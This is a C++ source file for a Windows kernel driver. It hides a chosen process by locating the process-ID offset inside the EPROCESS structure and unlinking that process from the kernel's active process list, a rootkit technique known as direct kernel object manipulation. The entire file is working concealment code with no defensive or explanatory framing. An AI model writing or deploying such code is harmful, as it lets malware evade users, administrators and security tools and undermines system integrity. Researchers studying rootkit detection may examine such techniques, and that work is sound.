#include "Driver.h"

ULONG HideProcess::GetUniquePIDOffSetFromEProcess()
{
	ULONG pid_ofs = 0; // The offset we're looking for
	int idx = 0;                // Index 
	ULONG pids[3]{0};				// List of PIDs for our 3 processes
	PEPROCESS eprocs[3];		// Process list, will contain 3 processes

	//Select 3 process PIDs and get their EPROCESS Pointer
	for (int i = 16; idx < 3; i += 4)
	{
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
		{
			pids[idx] = i;
			idx++;
		}
	}

	/*
	Go through the EPROCESS structure and look for the PID
	we can start at 0x20 because UniqueProcessId should
	not be in the first 0x20 bytes,
	also we should stop after 0x300 bytes with no success
	*/
	for (int i = 0x20; i < 0x800; i += 4)
	{
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i;
			break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	return pid_ofs;
}

NTSTATUS HideProcess::HideProcessByProcessID(ULONG pid)
{
	// Get PID offset nt!_EPROCESS.UniqueProcessId
	ULONG PID_OFFSET = GetUniquePIDOffSetFromEProcess();

	// Check if offset discovery was successful 
	if (PID_OFFSET == 0) 
	{
		return STATUS_NOT_FOUND;
	}

	// Get LIST_ENTRY offset nt!_EPROCESS.ActiveProcessLinks
	ULONG LIST_OFFSET = PID_OFFSET;


	// Check Architecture using pointer size
	INT_PTR ptr{};

	// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine
	LIST_OFFSET += sizeof(ptr);

	// Record offsets for user buffer
	KdPrint(("Found offsets: %lu & %lu", PID_OFFSET, LIST_OFFSET));

	// Get current process
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
	
	// Initialize other variables
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PULONG CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	// Check self 
	if (*(ULONG*)CurrentPID == pid) 
	{
		UnlinkCurrentProcessLinks(CurrentList);
		return STATUS_SUCCESS;
	}

	// Record the starting position
	PEPROCESS StartProcess = CurrentEPROCESS;

	// Move to next item
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	// Loop until we find the right process to remove
	// Or until we circle back
	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) 
	{

		// Check item
		if (*(ULONG*)CurrentPID == pid) {
			UnlinkCurrentProcessLinks(CurrentList);
			return STATUS_SUCCESS;
		}

		// Move to next item
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	return STATUS_NOT_FOUND;
}

void HideProcess::UnlinkCurrentProcessLinks(PLIST_ENTRY Current) {

	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	// Loop over self (connect previous with next)
	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;

	return;

}